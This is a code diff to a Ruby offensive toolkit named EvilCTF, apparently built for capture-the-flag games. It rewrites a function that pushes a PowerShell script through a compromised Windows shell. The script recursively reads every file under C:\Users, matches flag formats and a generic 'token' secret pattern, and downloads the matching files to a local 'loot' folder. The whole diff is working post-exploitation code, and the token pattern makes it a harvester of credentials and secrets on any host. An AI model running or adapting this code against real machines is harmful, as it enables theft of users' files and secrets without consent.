@@ -758,41 +758,53 @@ module EvilCTF::Tools
   end
   # New method for automatic flag scan and download
   def self.auto_download_flags(shell)
-    ps = <<~POWERSHELL
-      $users = Get-ChildItem C:\\Users -ErrorAction SilentlyContinue | Where-Object { $_.PSIsContainer }
-      $paths = @()
-      foreach ($u in $users) {
-        $paths += "$($u.FullName)\\Desktop\\flag.txt"
-        $paths += "$($u.FullName)\\Documents\\flag.txt"
-        $paths += "$($u.FullName)\\Downloads\\flag.txt"
-        $paths += "$($u.FullName)\\user.txt"
-        $paths += "$($u.FullName)\\root.txt"
+    # Use regex to find flag patterns
+    patterns = [
+      /flag\{[^\}]+\}/i,
+      /picoctf\{[^\}]+\}/i,
+      /htb\{[^\}]+\}/i,
+      /ctf\{[^\}]+\}/i,
+      /token\s*[:=]\s*["']?([^"'\s]+)["']?/i
+    ]
+
+  # Use Get-ChildItem with -Recurse and -Filter
+    ps = <<~PS
+      $patterns = #{patterns.map(&:source).to_json}
+      $files = Get-ChildItem -Path "C:\\Users" -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
+        $_.Length -gt 0 -and $_.Name -notmatch "^\." 
       }
-      $paths += "C:\\flag.txt", "C:\\user.txt", "C:\\root.txt"
-      foreach ($f in $paths) {
-        if (Test-Path $f) {
-          $c = Get-Content $f -Raw
-          Write-Output "FLAGFOUND|||$f|||$c"
-        }
+      $found = @()
+      foreach ($file in $files) {
+        try {
+          $content = Get-Content $file.FullName -Raw
+          $matches = $content | Select-String -Pattern $patterns -AllMatches
+          if ($matches) {
+            $flag = $matches.Matches | ForEach-Object { $_.Value }
+            $found += [PSCustomObject]@{
+              Path = $file.FullName
+              Content = $flag -join '; '
+            }
+          }
+        } catch {}
       }
-    POWERSHELL
+      $found | ConvertTo-Json -Depth 5
+    PS
+
     begin
       result = shell.run(ps)
-      result.output.each_line do |line|
-        next unless line.include?("FLAGFOUND|||")
-        parts = line.strip.split("|||", 3)
-        next unless parts.length == 3
-        path, value = parts[1].strip, parts[2].strip
-        puts "\n[+] Found flag: #{path}"
-        puts value
-        # Download to loot
-        local_path = "loot/#{File.basename(path)}"
-        EvilCTF::Uploader.download_file(path, local_path, shell)
+      data = JSON.parse(result.output)
+      data.each do |f|
+        puts "\n[+] Found flag: #{f['Path']}"
+        puts f['Content']
+        # Save to loot
+        local_path = "loot/#{File.basename(f['Path'])}"
+        EvilCTF::Uploader.download_file(f['Path'], local_path, shell)
       end
     rescue => e
       puts "[!] Flag scan failed: #{e.message}"
     end
   end
+
   def self.load_ps1(local_ps1, shell)
     return false unless File.exist?(local_ps1)
     remote = 'C:\\Users\\Public\\' + File.basename(local_ps1)
